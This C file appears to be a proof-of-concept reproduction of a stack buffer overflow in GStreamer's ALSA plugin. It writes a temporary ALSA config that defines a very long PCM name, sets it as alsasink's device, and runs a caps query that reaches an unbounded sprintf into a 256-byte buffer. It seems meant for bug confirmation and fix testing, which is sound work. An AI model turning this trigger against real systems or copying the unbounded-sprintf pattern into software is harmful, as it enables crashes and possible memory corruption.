/*
 * Repro for candidate 036: alsa_open_iec958_pcm_sprintf_overflow
 *
 * gst_alsa_open_iec958_pcm() in subprojects/gst-plugins-base/ext/alsa/gstalsa.c formats the
 * "device" string into a fixed 256-byte stack buffer with plain sprintf() and no bounds check:
 *
 *   char devstr[256];
 *   sprintf (devstr, "%s:{AES0 0x%02x AES1 0x%02x AES2 0x%02x AES3 0x%02x}", device, ...);
 *
 * This repro drives the REAL end-to-end path exactly as a real application would:
 *   1. It runs the real "device" GObject property via g_object_set() on a real alsasink element
 *      (not a hand-authored call directly into gst_alsa_open_iec958_pcm()).
 *   2. It performs a real GStreamer state change (NULL -> READY), which runs the element's own
 *      gst_alsasink_open() and really calls snd_pcm_open() with the attacker-controlled device
 *      string, exactly like a real pipeline would.
 *   3. It then performs a real caps query on the element's real sink pad (gst_pad_query_caps()),
 *      which is exactly what a real pipeline does during caps negotiation - this is what actually
 *      invokes gst_alsasink_getcaps() -> gst_alsa_probe_supported_formats() ->
 *      gst_alsa_open_iec958_pcm(), reusing the SAME device string.
 *
 * The only thing "faked" here is which physical/software ALSA PCM device name resolves - this
 * repro points ALSA at a local, self-contained config file (via ALSA_CONFIG_PATH) that defines a
 * PCM of type "null" under an intentionally very long name. This is the real, supported ALSA
 * mechanism a user's own ~/.asoundrc uses to define named PCM aliases; it requires no real audio
 * hardware, exactly like the candidate description says. Everything downstream of snd_pcm_open()
 * succeeding runs through the real gstalsa.c code, not a stand-in.
 */

#include <gst/gst.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/* Long enough that "<name>:{AES0 0x.. AES1 0x.. AES2 0x.. AES3 0x..}" (the sprintf's real output)
 * overflows devstr[256] by a comfortable margin - the format's own literal text (excluding %s)
 * is ~44 bytes, so a length here of ~250 chars produces ~294 bytes total, well past 256. */
#define DEVICE_NAME_LEN_DEFAULT 250
/* Overridable via argv[1] so the same binary can probe other lengths in the same bug class
 * (e.g. the exact devstr[256] boundary) without a rebuild - see CONFIRMATION.md section 7. */
static int device_name_len = DEVICE_NAME_LEN_DEFAULT;

static char device_name[4096];

static void
write_asound_conf (const char *path)
{
  FILE *f = fopen (path, "w");
  if (!f) {
    perror ("fopen asound.conf");
    exit (2);
  }
  /* A real, supported ALSA PCM alias definition - type "null" needs no real hardware. Any real
   * user's ~/.asoundrc can define a PCM alias exactly like this with an arbitrarily long name. */
  fprintf (f, "pcm.%s {\n    type null\n}\n", device_name);
  fclose (f);
}

int
main (int argc, char **argv)
{
  char conf_path[] = "/tmp/gst036_asound_XXXXXX";
  int fd;
  GstElement *sink;
  GstPad *sinkpad;
  GstStateChangeReturn sret;
  GstCaps *caps;

  if (argc > 1) {
    device_name_len = atoi (argv[1]);
    if (device_name_len <= 0 || device_name_len >= (int) sizeof (device_name)) {
      g_printerr ("invalid length argument\n");
      return 2;
    }
  }
  memset (device_name, 'A', device_name_len);
  device_name[device_name_len] = '\0';

  fd = mkstemp (conf_path);
  if (fd < 0) {
    perror ("mkstemp");
    return 2;
  }
  close (fd);
  write_asound_conf (conf_path);

  /* Real ALSA config-file mechanism, not a hand-built in-process stand-in. */
  setenv ("ALSA_CONFIG_PATH", conf_path, 1);

  gst_init (&argc, &argv);

  sink = gst_element_factory_make ("alsasink", NULL);
  if (!sink) {
    g_printerr ("Could not create alsasink element\n");
    return 2;
  }

  /* The real, public GObject "device" property, set exactly like a real application would via
   * g_object_set(). No use of any gstalsa.c-internal API at all. */
  g_object_set (sink, "device", device_name, NULL);

  g_print ("device property set (len=%zu): %.30s...\n", strlen (device_name), device_name);

  /* Real state transition -> real gst_alsasink_open() -> real snd_pcm_open(handle, device, ...) */
  sret = gst_element_set_state (sink, GST_STATE_READY);
  g_print ("set_state(READY) returned %d\n", sret);
  if (sret == GST_STATE_CHANGE_FAILURE) {
    g_printerr ("Failed to open device '%s' - cannot reach vulnerable code path, aborting repro\n",
        device_name);
    gst_object_unref (sink);
    unlink (conf_path);
    return 3;
  }

  sinkpad = gst_element_get_static_pad (sink, "sink");
  g_assert (sinkpad != NULL);

  g_print ("querying caps on real sink pad (this is what a real pipeline does during "
      "negotiation) -> triggers gst_alsasink_getcaps -> gst_alsa_probe_supported_formats -> "
      "gst_alsa_open_iec958_pcm...\n");

  /* This is the real trigger: GstBaseSink's own getcaps handling calls gst_alsasink_getcaps(),
   * which (since sink->handle != NULL after the READY transition above) calls
   * gst_alsa_probe_supported_formats(obj, sink->device, sink->handle, templ_caps), which itself
   * calls gst_alsa_open_iec958_pcm(obj, device) with the very same long device string - hitting
   * the vulnerable sprintf(). */
  caps = gst_pad_query_caps (sinkpad, NULL);
  if (caps) {
    g_print ("Got caps (unexpected if ASAN/stack-protector didn't already abort): %"
        GST_PTR_FORMAT "\n", caps);
    gst_caps_unref (caps);
  } else {
    g_print ("caps query returned NULL\n");
  }

  g_print ("REPRO DID NOT CRASH - if the fix is applied and the device name is safely truncated "
      "or rejected, this is the expected, correct outcome.\n");

  gst_object_unref (sinkpad);
  gst_element_set_state (sink, GST_STATE_NULL);
  gst_object_unref (sink);
  unlink (conf_path);

  return 0;
}
